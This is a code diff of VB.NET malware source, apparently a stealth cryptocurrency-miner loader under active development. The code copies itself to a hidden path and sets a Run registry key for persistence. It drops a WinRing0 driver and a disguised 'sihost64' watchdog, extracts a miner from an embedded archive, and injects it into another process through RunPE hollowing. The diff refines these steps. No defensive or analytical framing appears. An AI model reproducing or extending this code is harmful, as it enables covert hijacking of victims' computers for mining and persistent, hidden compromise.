@@ -35,13 +35,10 @@ Imports System.Text
 #End If
 
 Public Class Program
-    Public Shared IH As Boolean = False
-
     Public Shared Sub Main()
 #If INS Then
         Install()
 #End If
-        KillLastProc()
         Initialize()
     End Sub
 
@@ -57,15 +54,12 @@ Public Class Program
                         End If
                     Catch : End Try
                 Next
-                Using Drop As New FileStream(PayloadPath, FileMode.Create)
-                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
+                Using Drop As New System.IO.FileStream(PayloadPath, FileMode.Create)
+                    Dim Client As Byte() = System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                     Drop.Write(Client, 0, Client.Length)
                 End Using
-                If IH Then
-                    IO.File.SetAttributes(PayloadPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
-                End If
                 Thread.Sleep(2 * 1000)
-                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
+                Registry.CurrentUser.OpenSubKey(GetString("#REGKEY"), True).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                 Process.Start(PayloadPath)
                 Environment.Exit(0)
             End If
@@ -87,24 +81,31 @@ Public Class Program
     Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
         'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
-            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
+            Assembly.Load(PL).GetType(GetString("#DLLSTR")).GetMethod(GetString("#DLLOAD"), BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
         Catch ex As Exception
         End Try
     End Sub
 
-    Public Shared Sub KillLastProc()
+    Public Shared Function KillLastProc()
         On Error Resume Next
-        Dim objWMIService = GetObject("winmgmts: " & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
-        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
-        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
-        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
-        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
-        For Each retObject As Object In colProcess
-            If retObject.CommandLine.ToString.Contains("--don") Then
-                retObject.Terminate()
+        Dim options As ConnectionOptions = New ConnectionOptions()
+        options.Impersonation = ImpersonationLevel.Impersonate
+        Dim scope As ManagementScope = New ManagementScope("\\" + Environment.UserDomainName + "\root\cimv2", options)
+        scope.Connect()
+
+        Dim wmiQuery As String = String.Format("Select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
+        Dim query As ObjectQuery = New ObjectQuery(wmiQuery)
+        Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
+        Dim managementObjectCollection As ManagementObjectCollection = managementObjectSearcher.Get()
+
+        For Each retObject As ManagementObject In managementObjectCollection
+            If retObject("CommandLine").ToString().Contains("--donate-l") Then
+                Environment.Exit(0)
+                Return True
             End If
         Next
-    End Sub
+        Return False
+    End Function
 
     Public Shared Sub Initialize()
         If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
@@ -120,23 +121,44 @@ Public Class Program
             Dim rS As String = ""
 
             Try
-                System.IO.Directory.CreateDirectory(bD)
-                Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
-                DirInfo.Attributes = FileAttributes.System Or FileAttributes.Hidden
-                My.Computer.FileSystem.WriteAllBytes(bD & "WR64.sys", wr, False)
+                Try
+                    System.IO.Directory.CreateDirectory(bD)
+                    Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
 
-                Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
-                    For Each entry As ZipArchiveEntry In archive.Entries
-                        If entry.FullName.Contains("xm") Then
-                            Using streamdata As Stream = entry.Open()
-                                Using ms = New MemoryStream()
-                                    streamdata.CopyTo(ms)
-                                    xm = ms.ToArray
-                                End Using
-                            End Using
-                        End If
+
+#If INS Then
+                    For Each proc As Process In Process.GetProcessesByName("sihost64")
+                        proc.Kill()
                     Next
-                End Using
+
+                    Threading.Thread.Sleep(3000)
+
+                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))
+
+                    If Process.GetProcessesByName("sihost64").Length < 1 Then
+                        Process.Start(bD & "sihost64.exe")
+                    End If
+#End If
+
+                    System.IO.File.WriteAllBytes(bD & "WR64.sys", wr)
+                Catch ex As Exception
+                End Try
+
+                Try
+                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
+                        For Each entry As ZipArchiveEntry In archive.Entries
+                            If entry.FullName.Contains("xm") Then
+                                Using streamdata As Stream = entry.Open()
+                                    Using ms = New MemoryStream()
+                                        streamdata.CopyTo(ms)
+                                        xm = ms.ToArray
+                                    End Using
+                                End Using
+                            End If
+                        Next
+                    End Using
+                Catch ex As Exception
+                End Try
 
 #If EnableGPU Then
             Dim GPUstr as String = GetGPU
@@ -163,7 +185,11 @@ Public Class Program
 #End If
             Catch ex As Exception
             End Try
-            Run(GetTheResource("#dll"), GetString("#ARGSTR") + rS, xm)
+            Dim argstr As String = GetString("#ARGSTR") + rS
+            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
+            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
+            KillLastProc()
+            Run(GetTheResource("#dll"), argstr, xm)
         Catch ex As Exception
         End Try
     End Sub
